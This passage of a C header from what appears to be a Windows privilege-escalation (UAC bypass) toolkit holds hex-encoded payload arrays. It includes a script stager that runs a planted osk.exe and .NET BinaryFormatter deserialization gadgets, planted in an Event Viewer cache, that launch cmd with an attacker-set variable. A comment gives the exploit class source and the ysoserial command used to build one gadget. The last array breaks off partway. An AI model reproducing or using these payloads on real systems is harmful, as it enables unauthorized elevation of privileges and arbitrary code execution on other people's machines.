/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2025
*
*  TITLE:       ENCRESOURCE.H
*
*  VERSION:     3.68
*
*  DATE:        07 Mar 2025
*
*  Encoded string resources.
*
*  1) g_encodedKamikazeFinal - Kamikaze final stage launcher
*  2) string table elements
*  3) g_encodedRecentViews - eventvwr cache element generated with yososerial
*  4) g_encodedRecentViewsV2 - eventvwr cache element for dotnet2 generated with ysoserial
*  5) g_encodedTaskParamBegin, g_encodedTaskParamEnd - parameters data for the scheduler task
*  6) g_webviewvsinfo - WebView version info block
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

static const unsigned char g_encodedKamikazeFinal[121] = {
	0x3C, 0x68, 0x74, 0x6D, 0x6C, 0x3E, 0x3C, 0x62, 0x6F, 0x64, 0x79, 0x3E, 0x3C, 0x73, 0x63, 0x72,
	0x69, 0x70, 0x74, 0x3E, 0x65, 0x78, 0x74, 0x65, 0x72, 0x6E, 0x61, 0x6C, 0x2E, 0x45, 0x78, 0x65,
	0x63, 0x75, 0x74, 0x65, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x43, 0x6F, 0x6D, 0x6D, 0x61, 0x6E, 0x64,
	0x28, 0x22, 0x25, 0x74, 0x65, 0x6D, 0x70, 0x25, 0x5C, 0x5C, 0x6F, 0x73, 0x6B, 0x2E, 0x65, 0x78,
	0x65, 0x22, 0x2C, 0x22, 0x25, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x64, 0x72, 0x69, 0x76, 0x65,
	0x25, 0x22, 0x2C, 0x22, 0x22, 0x2C, 0x22, 0x52, 0x65, 0x73, 0x74, 0x6F, 0x72, 0x65, 0x64, 0x22,
	0x29, 0x3B, 0x3C, 0x2F, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E, 0x3C, 0x2F, 0x62, 0x6F, 0x64,
	0x79, 0x3E, 0x3C, 0x2F, 0x68, 0x74, 0x6D, 0x6C, 0x3E
};

static const unsigned char g_encodedRecentViews[1411] = {
	0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x4E, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61,
	0x74, 0x61, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x34, 0x2E, 0x30, 0x2E,
	0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75,
	0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33,
	0x34, 0x65, 0x30, 0x38, 0x39, 0x05, 0x01, 0x00, 0x00, 0x00, 0x13, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x0A, 0x00,
	0x00, 0x00, 0x16, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x52, 0x65, 0x6D, 0x6F, 0x74,
	0x69, 0x6E, 0x67, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x13, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65,
	0x74, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x4E, 0x61, 0x6D, 0x65, 0x11, 0x44, 0x61,
	0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x4E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x0E,
	0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x50, 0x72, 0x65, 0x66, 0x69, 0x78, 0x15, 0x44,
	0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x43, 0x61, 0x73, 0x65, 0x53, 0x65, 0x6E, 0x73, 0x69,
	0x74, 0x69, 0x76, 0x65, 0x12, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x4C, 0x6F, 0x63,
	0x61, 0x6C, 0x65, 0x4C, 0x43, 0x49, 0x44, 0x1A, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E,
	0x45, 0x6E, 0x66, 0x6F, 0x72, 0x63, 0x65, 0x43, 0x6F, 0x6E, 0x73, 0x74, 0x72, 0x61, 0x69, 0x6E,
	0x74, 0x73, 0x1A, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x45, 0x78, 0x74, 0x65, 0x6E,
	0x64, 0x65, 0x64, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73, 0x14, 0x44, 0x61,
	0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x2E, 0x43, 0x6F, 0x75,
	0x6E, 0x74, 0x10, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x54, 0x61, 0x62, 0x6C, 0x65,
	0x73, 0x5F, 0x30, 0x04, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x07, 0x1F, 0x53, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C,
	0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x02, 0x00, 0x00,
	0x00, 0x01, 0x08, 0x01, 0x08, 0x02, 0x02, 0x00, 0x00, 0x00, 0x05, 0xFD, 0xFF, 0xFF, 0xFF, 0x1F,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x53, 0x65, 0x72, 0x69,
	0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x01,
	0x00, 0x00, 0x00, 0x07, 0x76, 0x61, 0x6C, 0x75, 0x65, 0x5F, 0x5F, 0x00, 0x08, 0x02, 0x00, 0x00,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x04, 0x00, 0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00,
	0x09, 0x04, 0x00, 0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x00, 0x00, 0x00,
	0x09, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x00, 0x00, 0x00, 0x93, 0x03, 0x00, 0x00, 0x02, 0x00,
	0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0x02, 0x00, 0x00, 0x00, 0x5E, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E,
	0x50, 0x6F, 0x77, 0x65, 0x72, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x45, 0x64, 0x69, 0x74, 0x6F,
	0x72, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x30, 0x2E, 0x30,
	0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74,
	0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F,
	0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66, 0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33, 0x36,
	0x34, 0x65, 0x33, 0x35, 0x05, 0x01, 0x00, 0x00, 0x00, 0x42, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73,
	0x6F, 0x66, 0x74, 0x2E, 0x56, 0x69, 0x73, 0x75, 0x61, 0x6C, 0x53, 0x74, 0x75, 0x64, 0x69, 0x6F,
	0x2E, 0x54, 0x65, 0x78, 0x74, 0x2E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67,
	0x2E, 0x54, 0x65, 0x78, 0x74, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x52,
	0x75, 0x6E, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73, 0x01, 0x00, 0x00, 0x00,
	0x0F, 0x46, 0x6F, 0x72, 0x65, 0x67, 0x72, 0x6F, 0x75, 0x6E, 0x64, 0x42, 0x72, 0x75, 0x73, 0x68,
	0x01, 0x02, 0x00, 0x00, 0x00, 0x06, 0x03, 0x00, 0x00, 0x00, 0xB5, 0x05, 0x3C, 0x3F, 0x78, 0x6D,
	0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x22, 0x31, 0x2E, 0x30, 0x22, 0x20,
	0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D, 0x22, 0x75, 0x74, 0x66, 0x2D, 0x38, 0x22,
	0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50,
	0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x20, 0x4D, 0x65, 0x74, 0x68, 0x6F, 0x64, 0x4E, 0x61,
	0x6D, 0x65, 0x3D, 0x22, 0x53, 0x74, 0x61, 0x72, 0x74, 0x22, 0x20, 0x49, 0x73, 0x49, 0x6E, 0x69,
	0x74, 0x69, 0x61, 0x6C, 0x4C, 0x6F, 0x61, 0x64, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x64, 0x3D,
	0x22, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x22, 0x68,
	0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69,
	0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66,
	0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x2F, 0x70, 0x72, 0x65, 0x73,
	0x65, 0x6E, 0x74, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A,
	0x73, 0x64, 0x3D, 0x22, 0x63, 0x6C, 0x72, 0x2D, 0x6E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63,
	0x65, 0x3A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73,
	0x74, 0x69, 0x63, 0x73, 0x3B, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x3D, 0x53, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x22, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x78, 0x3D, 0x22, 0x68,
	0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69,
	0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x77, 0x69, 0x6E, 0x66,
	0x78, 0x2F, 0x32, 0x30, 0x30, 0x36, 0x2F, 0x78, 0x61, 0x6D, 0x6C, 0x22, 0x3E, 0x0D, 0x0A, 0x20,
	0x20, 0x3C, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76,
	0x69, 0x64, 0x65, 0x72, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x49, 0x6E, 0x73, 0x74, 0x61,
	0x6E, 0x63, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x64, 0x3A, 0x50, 0x72,
	0x6F, 0x63, 0x65, 0x73, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73,
	0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49,
	0x6E, 0x66, 0x6F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73,
	0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E,
	0x66, 0x6F, 0x20, 0x41, 0x72, 0x67, 0x75, 0x6D, 0x65, 0x6E, 0x74, 0x73, 0x3D, 0x22, 0x2F, 0x63,
	0x20, 0x25, 0x70, 0x65, 0x33, 0x38, 0x36, 0x25, 0x22, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61,
	0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x45, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67, 0x3D,
	0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64,
	0x61, 0x72, 0x64, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x45, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E,
	0x67, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x55, 0x73, 0x65,
	0x72, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x22, 0x20, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72,
	0x64, 0x3D, 0x22, 0x7B, 0x78, 0x3A, 0x4E, 0x75, 0x6C, 0x6C, 0x7D, 0x22, 0x20, 0x44, 0x6F, 0x6D,
	0x61, 0x69, 0x6E, 0x3D, 0x22, 0x22, 0x20, 0x4C, 0x6F, 0x61, 0x64, 0x55, 0x73, 0x65, 0x72, 0x50,
	0x72, 0x6F, 0x66, 0x69, 0x6C, 0x65, 0x3D, 0x22, 0x46, 0x61, 0x6C, 0x73, 0x65, 0x22, 0x20, 0x46,
	0x69, 0x6C, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x63, 0x6D, 0x64, 0x22, 0x20, 0x2F, 0x3E,
	0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F,
	0x63, 0x65, 0x73, 0x73, 0x2E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x73, 0x64, 0x3A, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
	0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x44, 0x61,
	0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72, 0x2E, 0x4F, 0x62, 0x6A, 0x65, 0x63,
	0x74, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x4F, 0x62,
	0x6A, 0x65, 0x63, 0x74, 0x44, 0x61, 0x74, 0x61, 0x50, 0x72, 0x6F, 0x76, 0x69, 0x64, 0x65, 0x72,
	0x3E, 0x0B, 0x0B
};

/*
// ExploitClass.dll
using System;

class ExploitClass
{
	public ExploitClass()
	{
		System.Diagnostics.Process.Start("cmd", "/c " + Environment.GetEnvironmentVariable("pe386"));
	}
}

ysoserial_frmv2.exe -o raw -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c .\ExploitClass.cs;System.dll > RecentViews
*/
static const unsigned char g_encodedRecentViewsV2[8427] = {
	0x00, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x0C, 0x02, 0x00, 0x00, 0x00, 0x4E, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61,
	0x74, 0x61, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E,
	0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75,
	0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33,
	0x34, 0x65, 0x30, 0x38, 0x39, 0x05, 0x01, 0x00, 0x00, 0x00, 0x13, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x0A, 0x00,
	0x00, 0x00, 0x16, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x52, 0x65, 0x6D, 0x6F, 0x74,
	0x69, 0x6E, 0x67, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x13, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65,
	0x74, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x4E, 0x61, 0x6D, 0x65, 0x11, 0x44, 0x61,
	0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x4E, 0x61, 0x6D, 0x65, 0x73, 0x70, 0x61, 0x63, 0x65, 0x0E,
	0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x50, 0x72, 0x65, 0x66, 0x69, 0x78, 0x15, 0x44,
	0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x43, 0x61, 0x73, 0x65, 0x53, 0x65, 0x6E, 0x73, 0x69,
	0x74, 0x69, 0x76, 0x65, 0x12, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x4C, 0x6F, 0x63,
	0x61, 0x6C, 0x65, 0x4C, 0x43, 0x49, 0x44, 0x1A, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E,
	0x45, 0x6E, 0x66, 0x6F, 0x72, 0x63, 0x65, 0x43, 0x6F, 0x6E, 0x73, 0x74, 0x72, 0x61, 0x69, 0x6E,
	0x74, 0x73, 0x1A, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x45, 0x78, 0x74, 0x65, 0x6E,
	0x64, 0x65, 0x64, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x69, 0x65, 0x73, 0x14, 0x44, 0x61,
	0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x2E, 0x43, 0x6F, 0x75,
	0x6E, 0x74, 0x10, 0x44, 0x61, 0x74, 0x61, 0x53, 0x65, 0x74, 0x2E, 0x54, 0x61, 0x62, 0x6C, 0x65,
	0x73, 0x5F, 0x30, 0x04, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x07, 0x1F, 0x53, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C,
	0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x02, 0x00, 0x00,
	0x00, 0x01, 0x08, 0x01, 0x08, 0x02, 0x02, 0x00, 0x00, 0x00, 0x05, 0xFD, 0xFF, 0xFF, 0xFF, 0x1F,
	0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x61, 0x74, 0x61, 0x2E, 0x53, 0x65, 0x72, 0x69,
	0x61, 0x6C, 0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x46, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x01,
	0x00, 0x00, 0x00, 0x07, 0x76, 0x61, 0x6C, 0x75, 0x65, 0x5F, 0x5F, 0x00, 0x08, 0x02, 0x00, 0x00,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x04, 0x00, 0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00,
	0x09, 0x04, 0x00, 0x00, 0x00, 0x00, 0x09, 0x04, 0x00, 0x00, 0x00, 0x0A, 0x01, 0x00, 0x00, 0x00,
	0x09, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x00, 0x00, 0x00, 0xFB, 0x1E, 0x00, 0x00, 0x02, 0x00,
	0x01, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x04, 0x01, 0x00, 0x00, 0x00, 0x7F, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6C,
	0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x2E, 0x47, 0x65, 0x6E, 0x65, 0x72, 0x69, 0x63,
	0x2E, 0x4C, 0x69, 0x73, 0x74, 0x60, 0x31, 0x5B, 0x5B, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E,
	0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x2C, 0x20, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62,
	0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x32, 0x2E, 0x30, 0x2E, 0x30, 0x2E,
	0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75, 0x74, 0x72,
	0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54, 0x6F, 0x6B,
	0x65, 0x6E, 0x3D, 0x62, 0x37, 0x37, 0x61, 0x35, 0x63, 0x35, 0x36, 0x31, 0x39, 0x33, 0x34, 0x65,
	0x30, 0x38, 0x39, 0x5D, 0x5D, 0x03, 0x00, 0x00, 0x00, 0x06, 0x5F, 0x69, 0x74, 0x65, 0x6D, 0x73,
	0x05, 0x5F, 0x73, 0x69, 0x7A, 0x65, 0x08, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x05,
	0x00, 0x00, 0x08, 0x08, 0x09, 0x02, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00,
	0x00, 0x10, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x09, 0x03, 0x00, 0x00, 0x00, 0x09,
	0x04, 0x00, 0x00, 0x00, 0x09, 0x05, 0x00, 0x00, 0x00, 0x09, 0x06, 0x00, 0x00, 0x00, 0x09, 0x07,
	0x00, 0x00, 0x00, 0x09, 0x08, 0x00, 0x00, 0x00, 0x09, 0x09, 0x00, 0x00, 0x00, 0x0A, 0x0C, 0x0A,
	0x00, 0x00, 0x00, 0x61, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x57, 0x6F, 0x72, 0x6B, 0x66,
	0x6C, 0x6F, 0x77, 0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x4D, 0x6F, 0x64,
	0x65, 0x6C, 0x2C, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x33, 0x2E, 0x30, 0x2E,
	0x30, 0x2E, 0x30, 0x2C, 0x20, 0x43, 0x75, 0x6C, 0x74, 0x75, 0x72, 0x65, 0x3D, 0x6E, 0x65, 0x75,
	0x74, 0x72, 0x61, 0x6C, 0x2C, 0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x4B, 0x65, 0x79, 0x54,
	0x6F, 0x6B, 0x65, 0x6E, 0x3D, 0x33, 0x31, 0x62, 0x66, 0x33, 0x38, 0x35, 0x36, 0x61, 0x64, 0x33,
	0x36, 0x34, 0x65, 0x33, 0x35, 0x05, 0x03, 0x00, 0x00, 0x00, 0x6A, 0x53, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x2E, 0x57, 0x6F, 0x72, 0x6B, 0x66, 0x6C, 0x6F, 0x77, 0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x6F,
	0x6E, 0x65, 0x6E, 0x74, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x2E, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C,
	0x69, 0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x41, 0x63, 0x74, 0x69, 0x76, 0x69, 0x74, 0x79,
	0x53, 0x75, 0x72, 0x72, 0x6F, 0x67, 0x61, 0x74, 0x65, 0x53, 0x65, 0x6C, 0x65, 0x63, 0x74, 0x6F,
	0x72, 0x2B, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x53, 0x75, 0x72, 0x72, 0x6F, 0x67, 0x61, 0x74,
	0x65, 0x2B, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A,
	0x65, 0x64, 0x52, 0x65, 0x66, 0x02, 0x00, 0x00, 0x00, 0x04, 0x74, 0x79, 0x70, 0x65, 0x0B, 0x6D,
	0x65, 0x6D, 0x62, 0x65, 0x72, 0x44, 0x61, 0x74, 0x61, 0x73, 0x03, 0x05, 0x1F, 0x53, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x2E, 0x55, 0x6E, 0x69, 0x74, 0x79, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69,
	0x7A, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x48, 0x6F, 0x6C, 0x64, 0x65, 0x72, 0x0A, 0x00, 0x00, 0x00,
	0x09, 0x0B, 0x00, 0x00, 0x00, 0x09, 0x0C, 0x00, 0x00, 0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x03,
	0x00, 0x00, 0x00, 0x09, 0x0D, 0x00, 0x00, 0x00, 0x09, 0x0E, 0x00, 0x00, 0x00, 0x01, 0x05, 0x00,
	0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x09, 0x0F, 0x00, 0x00, 0x00, 0x09, 0x10, 0x00, 0x00, 0x00,
	0x01, 0x06, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x09, 0x11, 0x00, 0x00, 0x00, 0x09, 0x12,
	0x00, 0x00, 0x00, 0x01, 0x07, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x09, 0x13, 0x00, 0x00,
	0x00, 0x09, 0x14, 0x00, 0x00, 0x00, 0x01, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x09,
	0x15, 0x00, 0x00, 0x00, 0x09, 0x16, 0x00, 0x00, 0x00, 0x04, 0x09, 0x00, 0x00, 0x00, 0x1C, 0x53,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x43, 0x6F, 0x6C, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E,
	0x73, 0x2E, 0x48, 0x61, 0x73, 0x68, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x07, 0x00, 0x00, 0x00, 0x0A,
